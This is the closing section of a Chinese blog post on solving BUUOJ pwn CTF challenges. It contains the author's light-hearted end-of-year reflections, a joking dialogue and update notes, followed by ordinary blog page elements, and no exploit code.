<h1 id="感想："><a href="#感想：" class="headerlink" title="感想："></a>感想：</h1><h3 id="2019年底了，我还是单身-ﾟДﾟ≡ﾟдﾟ-，一天天看着0202年的到来～～（划重点）"><a href="#2019年底了，我还是单身-ﾟДﾟ≡ﾟдﾟ-，一天天看着0202年的到来～～（划重点）" class="headerlink" title="2019年底了，我还是单身(ﾟДﾟ≡ﾟдﾟ)!?，一天天看着0202年的到来～～（划重点）"></a>2019年底了，我还是单身(ﾟДﾟ≡ﾟдﾟ)!?，一天天看着0202年的到来～～（划重点）</h3><h3 id="啦啦啦-完结撒花-今年的任务算是完成了～-￣▽￣～"><a href="#啦啦啦-完结撒花-今年的任务算是完成了～-￣▽￣～" class="headerlink" title="啦啦啦 完结撒花 今年的任务算是完成了～(￣▽￣～)"></a>啦啦啦 完结撒花 今年的任务算是完成了～(￣▽￣～)</h3><h3 id="这100个EXP算是对得起我今年努力和学习，同时巩固了自己的知识-｀・ω・´"><a href="#这100个EXP算是对得起我今年努力和学习，同时巩固了自己的知识-｀・ω・´" class="headerlink" title="这100个EXP算是对得起我今年努力和学习，同时巩固了自己的知识(｀・ω・´)"></a>这100个EXP算是对得起我今年努力和学习，同时巩固了自己的知识(｀・ω・´)</h3><h3 id="祝BUUOJ越来越好！（￣▽￣）-赵总越来越rich"><a href="#祝BUUOJ越来越好！（￣▽￣）-赵总越来越rich" class="headerlink" title="祝BUUOJ越来越好！（￣▽￣） 赵总越来越rich"></a>祝BUUOJ越来越好！（￣▽￣） 赵总越来越rich</h3><h1 id="南梦小剧场："><a href="#南梦小剧场：" class="headerlink" title="南梦小剧场："></a>南梦小剧场：</h1><h3 id="神秘人：BUUOJ刷题之旅续作还有吗，还有木有100个EXP吗？←-←"><a href="#神秘人：BUUOJ刷题之旅续作还有吗，还有木有100个EXP吗？←-←" class="headerlink" title="神秘人：BUUOJ刷题之旅续作还有吗，还有木有100个EXP吗？←_←"></a>神秘人：BUUOJ刷题之旅续作还有吗，还有木有100个EXP吗？←_←</h3><h3 id="南梦：之后的刷题之旅不再公开了，但是当前这篇刷题之旅会一直公开，至于之后有木有100个EXP，那就看我明年的学习成果了（你竟然想让我进一步秃头？？？-´；ω；-100个EXP，瞧瞧这是人说的话吗？）"><a href="#南梦：之后的刷题之旅不再公开了，但是当前这篇刷题之旅会一直公开，至于之后有木有100个EXP，那就看我明年的学习成果了（你竟然想让我进一步秃头？？？-´；ω；-100个EXP，瞧瞧这是人说的话吗？）" class="headerlink" title="南梦：之后的刷题之旅不再公开了，但是当前这篇刷题之旅会一直公开，至于之后有木有100个EXP，那就看我明年的学习成果了（你竟然想让我进一步秃头？？？ (´；ω；`) 100个EXP，瞧瞧这是人说的话吗？）"></a>南梦：之后的刷题之旅不再公开了，但是当前这篇刷题之旅会一直公开，至于之后有木有100个EXP，那就看我明年的学习成果了（你竟然想让我进一步秃头？？？ (´；ω；`) 100个EXP，瞧瞧这是人说的话吗？）</h3><h3 id="神秘人：你天天喊着找女朋友，有女朋友了还会继续刷题吗？"><a href="#神秘人：你天天喊着找女朋友，有女朋友了还会继续刷题吗？" class="headerlink" title="神秘人：你天天喊着找女朋友，有女朋友了还会继续刷题吗？"></a>神秘人：你天天喊着找女朋友，有女朋友了还会继续刷题吗？</h3><h3 id="南梦：有女朋友还打什么CTF，陪女朋友不好吗？（立即打开BUUOJ开始刷题，女朋友什么的最烦了）"><a href="#南梦：有女朋友还打什么CTF，陪女朋友不好吗？（立即打开BUUOJ开始刷题，女朋友什么的最烦了）" class="headerlink" title="南梦：有女朋友还打什么CTF，陪女朋友不好吗？（立即打开BUUOJ开始刷题，女朋友什么的最烦了）"></a>南梦：有女朋友还打什么CTF，陪女朋友不好吗？（立即打开BUUOJ开始刷题，女朋友什么的最烦了）</h3><h1 id="更新与维护"><a href="#更新与维护" class="headerlink" title="更新与维护"></a>更新与维护</h1><h3 id="后续可能会进一步更新x64和x32的解法（如果存在解的话）"><a href="#后续可能会进一步更新x64和x32的解法（如果存在解的话）" class="headerlink" title="后续可能会进一步更新x64和x32的解法（如果存在解的话）"></a>后续可能会进一步更新x64和x32的解法（如果存在解的话）</h3><h3 id="EXP解释之后可能会进一步完善（-就看我有没有女朋友了-°∀°-ﾉ-）"><a href="#EXP解释之后可能会进一步完善（-就看我有没有女朋友了-°∀°-ﾉ-）" class="headerlink" title="EXP解释之后可能会进一步完善（ 就看我有没有女朋友了(°∀°)ﾉ ）"></a>EXP解释之后可能会进一步完善（ 就看我有没有女朋友了(°∀°)ﾉ ）</h3></body></html></div></article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF    </a><a class="post-meta__tags" href="/tags/Pwn/">Pwn    </a></div><div class="post_share"><div class="social-share" data-image="/2019/07/13/CTF-BUUCTF-Pwn刷题之旅-(1)/bg.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><a class="reward-button button--primary button--animated"> <i class="fa fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="lazyload post-qr-code__img" src="/img/wechat.jpg" alt="微信"><div class="post-qr-code__desc">微信</div></li><li class="reward-item"><img class="lazyload post-qr-code__img" src="/img/alipay.jpg" alt="支付宝"><div class="post-qr-code__desc">支付宝</div></li></ul></div></a></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/2019/07/15/CTF-%E5%AE%89%E6%81%92%E6%9D%AF-19%E5%B9%B47%E6%9C%88%E8%B5%9B/"><img class="prev_cover lazyload" data-src="/2019/07/15/CTF-安恒杯-19年7月赛/bg.png" onerror="onerror=null;src='/img/404.jpg'"><div class="label">上一篇</div><div class="prev_info"><span>CTF-安恒杯-19年7月赛</span></div></a></div><div class="next-post pull_right"><a href="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/"><img class="next_cover lazyload" data-src="/2019/07/09/CTF-赛博杯CyberCTF-19年7月/bg.png" onerror="onerror=null;src='/img/404.jpg'"><div class="label">下一篇</div><div class="next_info"><span>CTF-赛博杯CyberCTF-19年7月</span></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fa fa-fw fa-thumbs-up" aria-hidden="true"></i><span> 相关推荐</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2018/12/07/CTF-JarvisOJ-Basic-ROPGadget/" title="CTF-JarvisOJ-Basic-ROPGadget"><img class="relatedPosts_cover lazyload"data-src="/2018/12/07/CTF-JarvisOJ-Basic-ROPGadget/2.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-03-19</div><div class="relatedPosts_title">CTF-JarvisOJ-Basic-ROPGadget</div></div></a></div><div class="relatedPosts_item"><a href="/2018/11/27/CTF-JarvisOJ-Basic-Shellcode/" title="CTF-JarvisOJ-Basic-Shellcode"><img class="relatedPosts_cover lazyload"data-src="/2018/11/27/CTF-JarvisOJ-Basic-Shellcode/2.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-03-19</div><div class="relatedPosts_title">CTF-JarvisOJ-Basic-Shellcode</div></div></a></div><div class="relatedPosts_item"><a href="/2018/12/12/CTF-JarvisOJ-Pwn-[61dctf]fm/" title="CTF-JarvisOJ-Pwn-[61dctf]fm"><img class="relatedPosts_cover lazyload"data-src="/2018/12/12/CTF-JarvisOJ-Pwn-[61dctf]fm/5.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-03-19</div><div class="relatedPosts_title">CTF-JarvisOJ-Pwn-[61dctf]fm</div></div></a></div><div class="relatedPosts_item"><a href="/2018/11/30/CTF-JarvisOJ-Pwn-[XMAN]level0/" title="CTF-JarvisOJ-Pwn-[XMAN]level0"><img class="relatedPosts_cover lazyload"data-src="/2018/11/30/CTF-JarvisOJ-Pwn-[XMAN]level0/9.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-03-19</div><div class="relatedPosts_title">CTF-JarvisOJ-Pwn-[XMAN]level0</div></div></a></div><div class="relatedPosts_item"><a href="/2018/11/30/CTF-JarvisOJ-Pwn-[XMAN]level1/" title="CTF-JarvisOJ-Pwn-[XMAN]level1"><img class="relatedPosts_cover lazyload"data-src="/2018/11/30/CTF-JarvisOJ-Pwn-[XMAN]level1/7.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-03-19</div><div class="relatedPosts_title">CTF-JarvisOJ-Pwn-[XMAN]level1</div></div></a></div><div class="relatedPosts_item"><a href="/2019/04/14/CTF-JarvisOJ-Pwn-[XMAN]level3_x64/" title="CTF-JarvisOJ-Pwn-[XMAN]level3_x64"><img class="relatedPosts_cover lazyload"data-src="/2019/04/14/CTF-JarvisOJ-Pwn-[XMAN]level3_x64/1.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-03-19</div><div class="relatedPosts_title">CTF-JarvisOJ-Pwn-[XMAN]level3_x64</div></div></a></div></div><div class="clear_both"></div></div><hr><div id="post-comment"><div class="comment_headling"><i class="fa fa-comments fa-fw" aria-hidden="true"></i><span> 评论</span></div><div id="gitalk-container"></div><script>var gitalk = new Gitalk({
  clientID: '560d606afb5e3201949f',
  clientSecret: 'adf278d9baa268981569ab6db3020b28d99f2aec',
  repo: '196011564.github.io',
  owner: '196011564',
  admin: '196011564',
  id: md5(decodeURI(location.pathname)),
  language: 'zh-CN# en , zh-CN , zh-TW',
  updateCountCallback: commentCount
})
gitalk.render('gitalk-container')

function commentCount(n){
  document.getElementsByClassName('gitalk-comment-count')[0].innerHTML= n
}</script></div></div></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2020 By 咲夜南梦</div><div class="framework-info"><span>驱动 </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="阅读模式"></i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="简繁转换" target="_self">繁</a><i class="darkmode fa fa-moon-o" id="darkmode" title="夜间模式"></i></div><div id="rightside-config-show"><div id="rightside_config" title="设置"><i class="fa fa-cog" aria-hidden="true"></i></div><a id="to_comment" href="#post-comment" title="直达评论"><i class="scroll_to_comment fa fa-comments">  </i></a><i class="fa fa-list-ul close" id="mobile-toc-button" title="目录" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="回到顶部" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@latest/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@latest/lazysizes.min.js" async=""></script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a>
 <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>